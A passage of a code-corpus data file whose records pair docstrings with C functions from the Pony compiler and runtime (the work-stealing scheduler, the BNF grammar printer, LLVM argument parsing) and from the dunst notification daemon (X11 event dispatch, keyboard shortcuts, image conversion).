if(!atomic_load_explicit(&scheduler_count_changing, memory_order_relaxed)\n      && !atomic_exchange_explicit(&scheduler_count_changing, true,\n      memory_order_acquire))\n    {\n#endif\n      // get active_scheduler_count\n      sched_count = get_active_scheduler_count();\n\n      // make sure active_scheduler_count == 1 if it is 0\n      // and we're scheduler 0 with noisy actors\n      // and we just pulled an actor off the inject queue\n      // or the ASIO is no longer noisy\n      // and we broke out of the earlier loop before suspending\n      // to return the actor\n      if(sched_count == 0)\n      {\n        // set active_scheduler_count to 1\n        sched_count = 1;\n        atomic_store_explicit(&active_scheduler_count,\n          sched_count, memory_order_relaxed);\n      }\n\n      // increment active_scheduler_count_check\n      sched_count_check = get_active_scheduler_count_check();\n\n      atomic_store_explicit(&active_scheduler_count_check,\n        sched_count_check + 1, memory_order_relaxed);\n\n      // ensure main active scheduler count and check variable match\n      // pony_assert(sched_count == sched_count_check);\n\n#if !defined(USE_SCHEDULER_SCALING_PTHREADS)\n      // unlock the bool that controls modifying the active scheduler count\n      // variable if using signals\n      atomic_store_explicit(&scheduler_count_changing, false,\n        memory_order_release);\n\n      // break while loop\n      break;\n    }\n  }\n#endif\n\n  return actor;\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Main function to print out grammar\n", "func_signal": "void print_grammar(bool antlr, bool clean)", "code": "{\n  bnf_t* tree = bnf_def(clean);\n  pony_assert(tree != NULL);\n\n  bnf_simplify(tree);\n\n  if(antlr)\n    bnf_avoid_antlr_bug(tree, tree);\n\n  bnf_mark_used_rules(tree);  // We only print rules that are used\n\n  if(antlr)\n    printf(\"%s\\n\", antlr_pre);\n\n  bnf_print(tree, false);\n\n  if(antlr)\n    printf(\"%s\\n\", antlr_post);\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Maybe wake up a scheduler thread if possible\n", "func_signal": "void ponyint_sched_maybe_wakeup(int32_t current_scheduler_id)", "code": "{\n  uint32_t current_active_scheduler_count = get_active_scheduler_count();\n\n  // if we have some schedulers that are sleeping, wake one up\n  if((current_active_scheduler_count < scheduler_count) &&\n#if defined(USE_SCHEDULER_SCALING_PTHREADS)\n    // try to acquire mutex if using pthreads\n    !pthread_mutex_trylock(&sched_mut)\n#else\n    // try and get the bool that controls modifying the active scheduler count\n    // variable if using signals\n    (!atomic_load_explicit(&scheduler_count_changing, memory_order_relaxed)\n      && !atomic_exchange_explicit(&scheduler_count_changing, true,\n      memory_order_acquire))\n#endif\n    )\n  {\n    // in case the count changed between the while check and now\n    current_active_scheduler_count = get_active_scheduler_count();\n\n    if(current_active_scheduler_count < scheduler_count)\n    {\n      // increment active_scheduler_count to wake a new scheduler up\n      current_active_scheduler_count++;\n      atomic_store_explicit(&active_scheduler_count, current_active_scheduler_count,\n        memory_order_relaxed);\n    }\n\n#if !defined(USE_SCHEDULER_SCALING_PTHREADS)\n    // unlock the bool that controls modifying the active scheduler count\n    // variable if using signals.\n    atomic_store_explicit(&scheduler_count_changing, false,\n      memory_order_release);\n#endif\n\n    // send signals to all scheduler threads that should be awake\n    // this is somewhat wasteful if a scheduler thread is already awake\n    // NOTE: this intentionally allows for the case where some scheduler\n    // threads might miss the signal and not wake up. That is handled as\n    // part of the beginning of the `run` loop and the while loop in\n    // ponyint_sched_maybe_wakeup_if_all_asleep\n    signal_suspended_threads(current_active_scheduler_count, current_scheduler_id);\n\n#if defined(USE_SCHEDULER_SCALING_PTHREADS)\n    // unlock mutex if using pthreads\n    pthread_mutex_unlock(&sched_mut);\n#endif\n  }\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// https://stackoverflow.com/questions/2736753/how-to-remove-extension-from-file-name\n// remove_ext: removes the \"extension\" from a file spec.\n//   path is the string to process.\n//   dot is the extension separator.\n//   sep is the path separator (0 means to ignore).\n// Returns an allocated string identical to the original but\n//   with the extension removed. It must be freed when you're\n//   finished with it.\n// If you pass in NULL or the new string can't be allocated,\n//   it returns NULL.\n", "func_signal": "char* remove_ext(const char* path, char dot, char sep, size_t* allocated_size)", "code": "{\n    char *retstr, *lastdot, *lastsep;\n    // Error checks and allocate string.\n    if (path == NULL)\n      return NULL;\n\n    *allocated_size = strlen(path) + 1;\n\n    retstr = (char*) ponyint_pool_alloc_size(*allocated_size);\n\n    // Make a copy and find the relevant characters.\n    strcpy(retstr, path);\n    lastdot = strrchr(retstr, dot);\n    lastsep = (sep == 0) ? NULL : strrchr(retstr, sep);\n\n    // If it has an extension separator.\n    if (lastdot != NULL) {\n      // and it's before the extension separator.\n      if (lastsep != NULL) {\n        if (lastsep < lastdot) {\n          // then remove it.\n          *lastdot = '\\0';\n        }\n      }\n      else {\n        // Has extension separator with no path separator.\n        *lastdot = '\\0';\n      }\n    }\n    // Return the modified string.\n    return retstr;\n}", "path": "ponyc/src/libponyc/platform/paths.c", "commit_date": "2018-08-22 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Mark rule definitions that are used\n", "func_signal": "static void bnf_mark_used_rules(bnf_t* tree)", "code": "{\n  // The first rule defined has an implicit reference, the entry point\n  tree->child->used = true;\n\n  bnf_mark_refd_defs(tree, tree->child);\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "/**\n * Handles the global queue and then pops from the local queue\n */\n", "func_signal": "static pony_actor_t* pop_global(scheduler_t* sched)", "code": "{\n  pony_actor_t* actor = (pony_actor_t*)ponyint_mpmcq_pop(&inject);\n\n  if(actor != NULL)\n    return actor;\n\n  if (sched == NULL)\n    return NULL;\n  else\n    return pop(sched);\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Print out the children of the given node, in ANTLR syntax.\n// The top_format parameters indicate we should use top level node within rule\n// formatting, which is slightly different to normal.\n", "func_signal": "static void bnf_print_children(bnf_t* bnf, const char* separator,\n  bool top_format, bool children_top_format)", "code": "{\n  pony_assert(bnf != NULL);\n  pony_assert(separator != NULL);\n\n  bnf_t* child = bnf->child;\n  pony_assert(child != NULL);\n\n  bool parens = !top_format && (child->sibling != NULL);\n\n  if(parens)\n    printf(\"(\");\n\n  bnf_print(child, children_top_format);\n\n  for(bnf_t* p = child->sibling; p != NULL; p = p->sibling)\n  {\n    printf(\"%s\", separator);\n    bnf_print(p, children_top_format);\n  }\n\n  if(parens)\n    printf(\")\");\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Print out the given node, in ANTLR syntax.\n// The top_format parameter indicates we should use top level node within rule\n// formatting, which is slightly different to normal.\n", "func_signal": "static void bnf_print(bnf_t* bnf, bool top_format)", "code": "{\n  if(bnf == NULL)\n    return;\n\n  switch(bnf->id)\n  {\n    case BNF_TREE:\n      bnf_print_children(bnf, \"\", true, true);\n      break;\n\n    case BNF_DEF:\n      // Only print marked rule and hack rules\n      if(bnf->used || bnf->name == NULL)\n      {\n        if(bnf->name == NULL)\n          printf(\"antlr_%d\\n  : \", bnf->hack_count);\n        else\n          printf(\"%s\\n  : \", bnf->name);\n\n        bnf_print(bnf->child, true);\n        printf(\"\\n  ;\\n\\n\");\n      }\n      break;\n\n    case BNF_SEQ:\n      bnf_print_children(bnf, \" \", top_format, false);\n      break;\n\n    case BNF_OR:\n      if(top_format && !bnf->optional)\n        bnf_print_children(bnf, \"\\n  | \", true, true);\n      else\n        bnf_print_children(bnf, \" | \", false, false);\n\n      if(bnf->optional)\n        printf(\"?\");\n\n      break;\n\n    case BNF_REPEAT:\n      bnf_print(bnf->child, false);\n      printf(\"*\");\n      break;\n\n    case BNF_TOKEN:\n    case BNF_RULE:\n      if(bnf->name == NULL)\n        printf(\"antlr_%d\", bnf->hack_count);\n      else\n        printf(\"%s\", bnf->name);\n      break;\n\n    case BNF_QUOTED_TOKEN:\n      bnf_print_quoted_token(bnf->name);\n      break;\n\n    case BNF_NEVER:\n      printf(\"NEVER\");\n      break;\n\n    case BNF_NOP:\n      printf(\"nop\");\n      break;\n\n    default:\n      pony_assert(false);\n      break;\n  }\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Add extra rules to get round the ANTLR interpreter bug\n", "func_signal": "static void bnf_avoid_antlr_bug(bnf_t* tree, bnf_t* bnf)", "code": "{\n  pony_assert(tree != NULL);\n\n  if(bnf == NULL)\n    return;\n\n  // First recurse into children\n  for(bnf_t* p = bnf->child; p != NULL; p = p->sibling)\n    bnf_avoid_antlr_bug(tree, p);\n\n  // We only care about cases where the 2nd child of an 'or' node immediately\n  // inside a 'repeat' node is a rule or sub-rule\n  if(bnf->id != BNF_REPEAT)\n    return;\n\n  bnf_t* or_node = bnf->child;\n  pony_assert(or_node != NULL);\n\n  if(or_node->id != BNF_OR)\n    return;\n\n  pony_assert(or_node->child != NULL);\n\n  bnf_t* second_child = or_node->child->sibling;\n\n  if(second_child == NULL || second_child->id == BNF_TOKEN ||\n    second_child->id == BNF_QUOTED_TOKEN)\n    return;\n\n  // This is the bug case. Move 'or' node into its own rule.\n  int rule_no = tree->hack_count++;\n\n  pony_assert(tree->last_child != NULL);\n  bnf_t* new_rule = bnf_create(BNF_DEF);\n  new_rule->hack_count = rule_no;\n  new_rule->child = or_node;\n\n  tree->last_child->sibling = new_rule;\n  tree->last_child = new_rule;\n\n  bnf_t* new_ref = bnf_create(BNF_RULE);\n  new_ref->hack_count = rule_no;\n  bnf->child = new_ref;\n  bnf->last_child = new_ref;\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Simplify the given tree as far as possible\n", "func_signal": "static void bnf_simplify(bnf_t* tree)", "code": "{\n  pony_assert(tree != NULL);\n\n  bool changed = true;\n\n  while(changed)\n  {\n    changed = false;\n    bnf_simplify_node(tree, tree, &changed);\n  }\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Attempt to simplify the given node.\n// We simplify from the bottom up, removing subrules that can never match or do\n// nothing. We also inline trivial rules when they are referenced.\n// The out_changed variable is set to true when any simplifications occur.\n", "func_signal": "static void bnf_simplify_node(bnf_t* tree, bnf_t* bnf, bool *out_changed)", "code": "{\n  pony_assert(bnf != NULL);\n  pony_assert(out_changed != NULL);\n\n  switch(bnf->id)\n  {\n    case BNF_TREE:\n      bnf_simplify_children(tree, bnf, NULL, NULL, out_changed);\n      break;\n\n    case BNF_DEF:\n      bnf_simplify_node(tree, bnf->child, out_changed);\n      break;\n\n    case BNF_SEQ:\n    {\n      bool any_never = false;\n      bnf_simplify_children(tree, bnf, &any_never, NULL, out_changed);\n\n      if(any_never)\n      {\n        bnf->id = BNF_NEVER;\n        *out_changed = true;\n      }\n      else if(bnf->child == NULL)\n      {\n        // Empty sequence\n        bnf->id = BNF_NOP;\n        *out_changed = true;\n      }\n      else if(bnf->child->sibling == NULL)\n      {\n        // Lone node in sequence\n        bnf_use_child(bnf);\n        *out_changed = true;\n      }\n\n      break;\n    }\n\n    case BNF_OR:\n    {\n      bool any_nop = false;\n      bnf_simplify_children(tree, bnf, NULL, &any_nop, out_changed);\n\n      if(any_nop)\n      {\n        bnf->optional = true;\n        *out_changed = true;\n      }\n\n      if(bnf->child == NULL)\n      {\n        // Empty set\n        bnf->id = (bnf->optional) ? BNF_NOP : BNF_NEVER;\n        *out_changed = true;\n      }\n      else if(bnf->child->sibling == NULL && !bnf->optional)\n      {\n        // Lone node in or\n        bnf_use_child(bnf);\n        *out_changed = true;\n      }\n\n      break;\n    }\n\n    case BNF_REPEAT:\n      bnf_simplify_children(tree, bnf, NULL, NULL, out_changed);\n\n      if(bnf->child == NULL)\n      {\n        // Empty body\n        bnf->id = BNF_NOP;\n        *out_changed = true;\n      }\n\n      break;\n\n    case BNF_RULE:\n    {\n      // Check for inlinable rules\n      if(bnf->name == NULL) // Hack rules aren't inlinable\n        break;\n\n      bnf_t* def = bnf_find_def(tree, bnf->name);\n      pony_assert(def != NULL);\n\n      bnf_t* rule = def->child;\n      pony_assert(rule != NULL);\n\n      // We inline rules that are nevers, nops, single token / rule references\n      // or have been explicitly marked to inline\n      if(rule->id == BNF_NEVER || rule->id == BNF_NOP ||\n        rule->id == BNF_TOKEN || rule->id == BNF_QUOTED_TOKEN ||\n        rule->id == BNF_RULE || def->inline_rule)\n      {\n        // Inline rule\n        bnf->id = rule->id;\n        bnf->name = rule->name;\n        bnf->optional = rule->optional;\n        bnf->last_child = NULL;\n        bnf->child = bnf_copy(rule->child, &bnf->last_child);\n\n        // Child of def should only ever have one child, so don't need to worry\n        // about copying siblings\n        pony_assert(rule->sibling == NULL);\n\n        // Don't worry about simplifying children now, leave that til the next\n        // iteration\n        *out_changed = true;\n      }\n\n      break;\n    }\n\n    default:\n      break;\n  }\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "/**\n * Use mpmcqs to allow stealing directly from a victim, without waiting for a\n * response.\n */\n", "func_signal": "static pony_actor_t* steal(scheduler_t* sched)", "code": "{\n  bool block_sent = false;\n  uint32_t steal_attempts = 0;\n  uint64_t tsc = ponyint_cpu_tick();\n  pony_actor_t* actor;\n  scheduler_t* victim = NULL;\n\n  while(true)\n  {\n    victim = choose_victim(sched);\n\n    actor = pop_global(victim);\n    if(actor != NULL)\n      break;\n\n    uint64_t tsc2 = ponyint_cpu_tick();\n\n    if(read_msg(sched))\n    {\n      // An actor was unmuted and added to our run queue. Pop it and return.\n      // Effectively, we are \"stealing\" from ourselves. We need to verify that\n      // popping succeeded (actor != NULL) as some other scheduler might have\n      // stolen the newly scheduled actor from us already. Schedulers, what a\n      // bunch of thieving bastards!\n      actor = pop_global(sched);\n      if(actor != NULL)\n        break;\n    }\n\n    if(quiescent(sched, tsc, tsc2))\n    {\n      DTRACE2(WORK_STEAL_FAILURE, (uintptr_t)sched, (uintptr_t)victim);\n      return NULL;\n    }\n\n    // Determine if we are blocked.\n    //\n    // Note, \"blocked\" means we have no more work to do and we believe that we\n    // should check to see if we can terminate the program.\n    //\n    // To be blocked, we have to:\n    //\n    // 1. Not have any noisy actors registered with the ASIO thread/subsystem.\n    //    If we have any noisy actors then, while we might not have any work\n    //    to do, we aren't blocked. Blocked means we can't make forward\n    //    progress and the program might be ready to terminate. Noisy actors\n    //    means that no, the program isn't ready to terminate becuase one of\n    //    noisy actors could receive a message from an external source (timer,\n    //    network, etc).\n    // 2. Not have any muted actors. If we are holding any muted actors then,\n    //    while we might not have any work to do, we aren't blocked. Blocked\n    //    means we can't make forward progress and the program might be ready\n    //    to terminate. Muted actors means that no, the program isn't ready\n    //    to terminate.\n    // 3. We have attempted to steal from every other scheduler and failed to\n    //    get any work. In the process of stealing from every other scheduler,\n    //    we will have also tried getting work off the ASIO inject queue\n    //    multiple times\n    // 4. We've been trying to steal for at least PONY_SCHED_BLOCK_THRESHOLD\n    //    cycles (currently 1000000).\n    //    In many work stealing scenarios, we immediately get steal an actor.\n    //    Sending a block/unblock pair in that scenario is very wasteful.\n    //    Same applies to other \"quick\" steal scenarios.\n    //    1 million cycles is roughly 1 millisecond, depending on clock speed.\n    //    By waiting 1 millisecond before sending a block message, we are going to\n    //    delay quiescence by a small amount of time but also optimize work\n    //    stealing for generating far fewer block/unblock messages.\n    uint32_t current_active_scheduler_count = get_active_scheduler_count();\n    uint64_t clocks_elapsed = tsc2 - tsc;\n\n    if (!block_sent)\n    {\n      // make sure thread scaling order is still valid. we should never be\n      // active if the active_scheduler_count isn't larger than our index.\n      pony_assert(current_active_scheduler_count > (uint32_t)sched->index);\n\n      if (steal_attempts < current_active_scheduler_count)\n      {\n        steal_attempts++;\n      }\n      else if ((clocks_elapsed > PONY_SCHED_BLOCK_THRESHOLD) &&\n        (ponyint_mutemap_size(&sched->mute_mapping) == 0))\n      {\n        // only try and suspend if enough time has passed\n        if(clocks_elapsed > scheduler_suspend_threshold)\n        {\n          // in case active scheduler count changed\n          current_active_scheduler_count = get_active_scheduler_count();\n\n          actor = perhaps_suspend_scheduler(sched, current_active_scheduler_count,\n            &block_sent, &steal_attempts, true);\n          if (actor != NULL)\n            break;\n        }\n\n        if(!sched->asio_noisy)\n        {\n          // Only send block messages if there are no noisy actors registered\n          // with the ASIO thread\n          if(sched->index == 0)\n            handle_sched_block(sched);\n          else\n            send_msg(sched->index, 0, SCHED_BLOCK, 0);\n\n          block_sent = true;\n        }\n      }\n    }\n    else\n    {\n      // block sent and no work to do. We should try and suspend if we can now\n      // if we do suspend, we'll send a unblock message first to ensure cnf/ack\n      // cycle works as expected\n\n      // make sure thread scaling order is still valid. we should never be\n      // active if the active_scheduler_count isn't larger than our index.\n      pony_assert(current_active_scheduler_count > (uint32_t)sched->index);\n\n      // only try and suspend if enough time has passed\n      if(clocks_elapsed > scheduler_suspend_threshold)\n      {\n        actor = perhaps_suspend_scheduler(sched, current_active_scheduler_count,\n          &block_sent, &steal_attempts, false);\n        if (actor != NULL)\n          break;\n      }\n    }\n\n    // if we're scheduler 0 and cycle detection is enabled\n    if(!ponyint_actor_getnoblock() && (sched->index == 0))\n    {\n      // trigger cycle detector by sending it a message if it is time\n      uint64_t current_tsc = ponyint_cpu_tick();\n      if(ponyint_cycle_check_blocked(last_cd_tsc, current_tsc))\n      {\n        last_cd_tsc = current_tsc;\n\n        // cycle detector should now be on the queue\n        actor = pop_global(sched);\n        if(actor != NULL)\n          break;\n      }\n    }\n  }\n\n  if(block_sent)\n  {\n    // Only send unblock message if a corresponding block message was sent\n    if(sched->index == 0)\n      handle_sched_unblock(sched);\n    else\n      send_msg(sched->index, 0, SCHED_UNBLOCK, 0);\n  }\n  DTRACE3(WORK_STEAL_SUCCESSFUL, (uintptr_t)sched, (uintptr_t)victim, (uintptr_t)actor);\n  return actor;\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Process the llvm-args option and pass to LLVMParseCommandLineOptions\n", "func_signal": "static void process_llvm_args(pass_opt_t* opt)", "code": "{\n  if(!opt->llvm_args) return;\n  // Copy to a mutable buffer\n  size_t raw_opt_str_size = strlen(opt->llvm_args) + 1;\n  char* buffer = (char*)malloc(sizeof(char) * raw_opt_str_size);\n  strncpy(buffer, opt->llvm_args, raw_opt_str_size);\n  // Create a two-dimension array as argv\n  size_t argv_buf_size = 4;\n  const char** argv_buffer\n    = (const char**)malloc(sizeof(const char*) * argv_buf_size);\n\n  size_t token_counter = 0;\n  // Put argv[0] first\n  argv_buffer[token_counter++] = opt->argv0;\n  // Tokenize the string\n  char* token = strtok(buffer, \",\");\n  while(token) {\n    if(++token_counter > argv_buf_size) {\n      // Double the size\n      argv_buf_size <<= 1;\n      argv_buffer = (const char**)realloc(argv_buffer,\n                                          sizeof(const char*) * argv_buf_size);\n    }\n    argv_buffer[token_counter - 1] = (const char*)token;\n    token = strtok(NULL, \",\");\n  }\n\n  LLVMParseCommandLineOptions((int)token_counter,\n                              (const char* const*)argv_buffer,\n                              NULL);\n\n  free(argv_buffer);\n  free(buffer);\n}", "path": "ponyc/src/libponyc/codegen/codegen.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Build a list of token references with the given node\n", "func_signal": "static void bnf_token_set(bnf_t* bnf, token_id* tokens, bool clean)", "code": "{\n  pony_assert(bnf != NULL);\n\n  for(int i = 0; tokens[i] != TK_NONE; i++)\n  {\n    bnf_t* p = bnf_add(bnf_create(BNF_TOKEN), bnf);\n    pony_assert(p != NULL);\n\n    //token_id next = tokens[i + 1];\n\n    switch(tokens[i])\n    {\n      // Special case tokens\n      case TK_EOF: p->name = \"\"; break;\n      case TK_STRING: p->name = \"STRING\"; break;\n      case TK_INT: p->name = \"INT\"; break;\n      case TK_FLOAT: p->name = \"FLOAT\"; break;\n      case TK_ID: p->name = \"ID\"; break;\n      case TK_LPAREN_NEW: p->name = \"LPAREN_NEW\"; break;\n      case TK_LSQUARE_NEW: p->name = \"LSQUARE_NEW\"; break;\n      case TK_MINUS_NEW: p->name = \"MINUS_NEW\"; break;\n      case TK_MINUS_TILDE_NEW: p->name = \"MINUS_TILDE_NEW\"; break;\n\n      default:\n        // Fixed text tokens: keywords, symbols, etc\n        p->name = lexer_print(tokens[i]);\n        p->id = BNF_QUOTED_TOKEN;\n\n        pony_assert(p->name != NULL);\n\n        if((clean && p->name[0] == '$') || tokens[i] == TK_NEWLINE)\n        {\n          // Remove unclean symbol\n          p->id = BNF_NEVER;\n        }\n\n        break;\n    }\n  }\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "/*\n * Main Dispatcher for XEvents\n */\n", "func_signal": "gboolean x_mainloop_fd_dispatch(GSource *source, GSourceFunc callback, gpointer user_data)", "code": "{\n        struct window_x11 *win = ((struct x11_source*) source)->win;\n\n        bool fullscreen_now;\n        const struct screen_info *scr;\n        XEvent ev;\n        unsigned int state;\n        while (XPending(xctx.dpy) > 0) {\n                XNextEvent(xctx.dpy, &ev);\n\n                switch (ev.type) {\n                case Expose:\n                        LOG_D(\"XEvent: processing 'Expose'\");\n                        if (ev.xexpose.count == 0 && win->visible) {\n                                draw();\n                        }\n                        break;\n                case ButtonRelease:\n                        LOG_D(\"XEvent: processing 'ButtonRelease'\");\n                        if (ev.xbutton.window == win->xwin) {\n                                x_handle_click(ev);\n                                wake_up();\n                        }\n                        break;\n                case KeyPress:\n                        LOG_D(\"XEvent: processing 'KeyPress'\");\n                        state = ev.xkey.state;\n                        /* NumLock is also encoded in the state. Remove it. */\n                        state &= ~x_numlock_mod();\n                        if (settings.close_ks.str\n                            && XLookupKeysym(&ev.xkey,\n                                             0) == settings.close_ks.sym\n                            && settings.close_ks.mask == state) {\n                                const GList *displayed = queues_get_displayed();\n                                if (displayed && displayed->data) {\n                                        queues_notification_close(displayed->data, REASON_USER);\n                                        wake_up();\n                                }\n                        }\n                        if (settings.history_ks.str\n                            && XLookupKeysym(&ev.xkey,\n                                             0) == settings.history_ks.sym\n                            && settings.history_ks.mask == state) {\n                                queues_history_pop();\n                                wake_up();\n                        }\n                        if (settings.close_all_ks.str\n                            && XLookupKeysym(&ev.xkey,\n                                             0) == settings.close_all_ks.sym\n                            && settings.close_all_ks.mask == state) {\n                                queues_history_push_all();\n                                wake_up();\n                        }\n                        if (settings.context_ks.str\n                            && XLookupKeysym(&ev.xkey,\n                                             0) == settings.context_ks.sym\n                            && settings.context_ks.mask == state) {\n                                context_menu();\n                                wake_up();\n                        }\n                        break;\n                case CreateNotify:\n                        LOG_D(\"XEvent: processing 'CreateNotify'\");\n                        if (win->visible &&\n                            ev.xcreatewindow.override_redirect == 0)\n                                XRaiseWindow(xctx.dpy, win->xwin);\n                        break;\n                case PropertyNotify:\n                        if (ev.xproperty.atom == XA_RESOURCE_MANAGER) {\n                                LOG_D(\"XEvent: processing PropertyNotify for Resource manager\");\n                                XRM_update_db();\n                                screen_dpi_xft_cache_purge();\n\n                                if (win->visible) {\n                                        draw();\n                                }\n                                break;\n                        }\n                        /* Explicitly fallthrough. Other PropertyNotify events, e.g. catching\n                         * _NET_WM get handled in the Focus(In|Out) section */\n                case ConfigureNotify:\n                case FocusIn:\n                case FocusOut:\n                        LOG_D(\"XEvent: Checking for active screen changes\");\n                        fullscreen_now = have_fullscreen_window();\n                        scr = get_active_screen();\n\n                        if (fullscreen_now != fullscreen_last) {\n                                fullscreen_last = fullscreen_now;\n                                wake_up();\n                        } else if (   settings.f_mode != FOLLOW_NONE\n                        /* Ignore PropertyNotify, when we're still on the\n                         * same screen. PropertyNotify is only necessary\n                         * to detect a focus change to another screen\n                         */\n                                   && win->visible\n                                   && scr->id != win->cur_screen) {\n                                draw();\n                                win->cur_screen = scr->id;\n                        }\n                        break;\n                default:\n                        if (!screen_check_event(&ev)) {\n                                LOG_D(\"XEvent: Ignoring '%d'\", ev.type);\n                        }\n\n                        break;\n                }\n        }\n        return G_SOURCE_CONTINUE;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Initialize the keyboard shortcut.\n */\n", "func_signal": "static void x_shortcut_init(struct keyboard_shortcut *ks)", "code": "{\n        ASSERT_OR_RET(ks && ks->str,);\n\n        if (STR_EQ(ks->str, \"none\") || (STR_EQ(ks->str, \"\"))) {\n                ks->is_valid = false;\n                return;\n        }\n\n        char *str = g_strdup(ks->str);\n        char *str_begin = str;\n\n        while (strchr(str, '+')) {\n                char *mod = str;\n                while (*str != '+')\n                        str++;\n                *str = '\\0';\n                str++;\n                g_strchomp(mod);\n                ks->mask = ks->mask | x_shortcut_string_to_mask(mod);\n        }\n        g_strstrip(str);\n\n        ks->sym = XStringToKeysym(str);\n        /* find matching keycode for ks->sym */\n        int min_keysym, max_keysym;\n        XDisplayKeycodes(xctx.dpy, &min_keysym, &max_keysym);\n\n        ks->code = NoSymbol;\n\n        for (int i = min_keysym; i <= max_keysym; i++) {\n                if (XkbKeycodeToKeysym(xctx.dpy, i, 0, 0) == ks->sym\n                    || XkbKeycodeToKeysym(xctx.dpy, i, 0, 1) == ks->sym) {\n                        ks->code = i;\n                        break;\n                }\n        }\n\n        if (ks->sym == NoSymbol || ks->code == NoSymbol) {\n                LOG_W(\"Unknown keyboard shortcut: '%s'\", ks->str);\n                ks->is_valid = false;\n        } else {\n                ks->is_valid = true;\n        }\n\n        g_free(str_begin);\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Hide the window and ungrab unused keyboard_shortcuts\n */\n", "func_signal": "void x_win_hide(window winptr)", "code": "{\n        LOG_I(\"X11: Hiding window\");\n        struct window_x11 *win = (struct window_x11*)winptr;\n        ASSERT_OR_RET(win->visible,);\n\n        x_shortcut_ungrab(&settings.close_ks);\n        x_shortcut_ungrab(&settings.close_all_ks);\n        x_shortcut_ungrab(&settings.context_ks);\n\n        XUngrabButton(xctx.dpy, AnyButton, AnyModifier, win->xwin);\n        XUnmapWindow(xctx.dpy, win->xwin);\n        XFlush(xctx.dpy);\n        win->visible = false;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/**\n * Reassemble the data parts of a GdkPixbuf into a cairo_surface_t's data field.\n *\n * Requires to call on the surface flush before and mark_dirty after the execution.\n */\n", "func_signal": "static void pixbuf_data_to_cairo_data(\n                const unsigned char *pixels_p,\n                      unsigned char *pixels_c,\n                size_t rowstride_p,\n                size_t rowstride_c,\n                int width,\n                int height,\n                int n_channels)", "code": "{\n#if G_BYTE_ORDER == G_LITTLE_ENDIAN\n        static const size_t CAIRO_B = 0;\n        static const size_t CAIRO_G = 1;\n        static const size_t CAIRO_R = 2;\n        static const size_t CAIRO_A = 3;\n#elif G_BYTE_ORDER == G_BIG_ENDIAN\n        static const size_t CAIRO_A = 0;\n        static const size_t CAIRO_R = 1;\n        static const size_t CAIRO_G = 2;\n        static const size_t CAIRO_B = 3;\n#elif G_BYTE_ORDER == G_PDP_ENDIAN\n        static const size_t CAIRO_R = 0;\n        static const size_t CAIRO_A = 1;\n        static const size_t CAIRO_B = 2;\n        static const size_t CAIRO_G = 3;\n#else\n// GLib doesn't support any other endiannesses\n#error Unsupported Endianness\n#endif\n\n        assert(pixels_p);\n        assert(pixels_c);\n        assert(width > 0);\n        assert(height > 0);\n\n        if (n_channels == 3) {\n                for (int h = 0; h < height; h++) {\n                              unsigned char *iter_c = pixels_c + h * rowstride_c;\n                        const unsigned char *iter_p = pixels_p + h * rowstride_p;\n                        for (int w = 0; w < width; w++) {\n                                iter_c[CAIRO_R] = iter_p[0];\n                                iter_c[CAIRO_G] = iter_p[1];\n                                iter_c[CAIRO_B] = iter_p[2];\n                                iter_c[CAIRO_A] = 0xff;\n                                iter_c += 4;\n                                iter_p += n_channels;\n                        }\n                }\n        } else {\n                for (int h = 0; h < height; 